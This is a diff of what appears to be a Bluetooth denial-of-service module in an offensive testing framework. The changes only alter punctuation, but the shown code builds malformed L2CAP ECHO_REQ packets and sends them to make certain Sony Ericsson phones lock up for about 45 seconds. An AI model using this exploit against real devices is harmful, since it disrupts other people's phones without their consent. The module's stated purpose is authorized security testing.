@@ -6,7 +6,7 @@ Sends an L2CAP ECHO_REQ with a malformed length field. Vulnerable
 Sony/Ericsson handsets (K600i, V600i, K750i, W800i, …) slowly fade their
 screen to black, then white, then recover after ~45 seconds.
 
-Pure protocol DoS — no payload, no RCE.
+Pure protocol DoS, no payload, no RCE.
 """
 
 import struct
@@ -79,7 +79,7 @@ class Module(DosModule):
         }
 
     def _build_payload(self) -> bytes:
-        # 4-byte L2CAP cmd hdr: code, ident, len(LE16) — len=1 but no body
+        # 4-byte L2CAP cmd hdr: code, ident, len(LE16), len=1 but no body
         return struct.pack("<BBH", L2CAP_ECHO_REQ, 1, _FAKE_LEN)
 
     def run(self) -> bool:
@@ -101,7 +101,7 @@ class Module(DosModule):
         print(f"  {C.RED}╚{'═'*55}╝{C.RESET}\n")
         print_info(f"Target : {target}")
         print_info(f"Packets: {count} × {_PAYLOAD_SIZE} bytes")
-        print_warning("Authorized testing only — vulnerable phones lock up ~45 s")
+        print_warning("Authorized testing only, vulnerable phones lock up ~45 s")
 
         sock = None
         sent = 0
@@ -110,7 +110,7 @@ class Module(DosModule):
             sock.settimeout(10)
             print_info(f"Connecting to {target}...")
             sock.connect((target, 1))   # PSM 1 (SDP)
-            print_success("Connected — sending malformed ECHO_REQ")
+            print_success("Connected, sending malformed ECHO_REQ")
 
             payload = self._build_payload()
             for i in range(count):
